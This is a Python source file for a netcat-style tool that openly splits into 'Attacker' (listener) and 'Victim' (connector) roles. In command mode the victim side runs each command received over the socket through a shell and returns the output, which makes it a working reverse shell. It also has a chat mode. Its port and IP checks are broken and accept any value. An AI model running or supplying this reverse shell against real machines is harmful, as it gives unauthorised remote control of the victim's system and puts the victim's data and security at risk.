import socket
import _thread
from threading import Thread
import sys
import getopt
import subprocess
import os
import re

def SendMessage(con):
    message = ''
    while message != 'exit':
        message = input("Message to send:\n")
        con.sendall(message.encode())
    sys.exit("Exiting...")

def GetMessage(con):
    while True:
        data = con.recv(1024).decode()
        print("----------------------------------")
        print(data)
        print("----------------------------------")
        print("Message to send:")

def SendMode(con):
    Thread(target=SendMessage, args=[con]).start()
    Thread(target=GetMessage, args=[con]).start()

def Attacker(ip,port,ss):
    attack = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    attack.bind((ip,port))
    attack.listen(5)
    print("[*] Waiting for connection...")
    if ss == 'CommandMode':
        while True:
            con, addr = attack.accept()
            print("[*]Connection has been established | " + str(addr[0]) + ":" + str(addr[1]))
            while True:
                command = input("$> ")
                con.sendall(command.encode())
                result = con.recv(1024)
                print(result.decode())

    if ss == 'SendMode':
        while True:
            con, addr = attack.accept()
            print("[*]Connection has been established | " + str(addr[0]) + ":" + str(addr[1]))
            _thread.start_new_thread(SendMode,(con,))

def Victim(ip,port,ss):
    victim = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    victim.connect((ip,port))
    if ss == 'CommandMode':
        while True:
            command= victim.recv(1024).decode()
            result = subprocess.Popen(command,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE,shell=True)
            outs = result.stdout.read() + result.stderr.read()
            outs_str = outs.decode()
            victim.sendall(str.encode(outs_str+ os.getcwd()))

    if ss == 'SendMode':
        print("[*] Connection has been established")
        SendMode(victim)

iptarget = '127.0.0.1'
port = 0
status = "Victim"
mode = "SendMode"
argumentotal = 0

options, _ = getopt.getopt(sys.argv[1:],"t:p:lc",["target=","port=","listen","command"])
for key,value in options:
    if key == '-p' or key == '--port':
        argumentotal += 1
        portemp = int(value)
        if portemp <= 4096 or portemp >= 10:
            port = portemp
        else :
            sys.exit("Port must be in range 10 and 4096")
    if key == '-l' or key == '--listen':
        argumentotal += 1
        status = 'Attacker'
    if key == '-c' or key == '--command':
        argumentotal += 1
        mode = 'CommandMode'
    if status == 'Victim':
        if key == '-t' or key == '--target':
            argumentotal += 1
            if re.finditer("[0-2][0-9][0-9]\.[0-2][0-9][0-9]\.[0-2][0-9][0-9]",value):
                iptarget = value
            else:
                sys.exit("Please insert Valid IP Format")

if argumentotal == 0:
    print("Usage")
    print("-p [port] -l")
    print("-t [target_host] -p [port]")
    print("-p [port] -l -c")
    print("-t [target_host] -p [port] -c")
    print("")
    print("Description:")
    print("-t --target  - set the target")
    print("-p --port    - set the port to be used (between 10 and 4096)")
    print("-l --listen  - listen on [target]:[port] for incoming connection")
    print("-c --command - initialize a command shell")
    print("")
    print("Example:")
    print("-p 8000 -l")
    print("-t 127.0.0.1 -p 8000")
    print("-p 8000 -l -c")
    print("-t 127.0.0.1 -p 8000 -c")
    sys.exit()

if status == 'Attacker':
    Attacker(iptarget,port,mode)
elif status == 'Victim':
    Victim(iptarget,port,mode)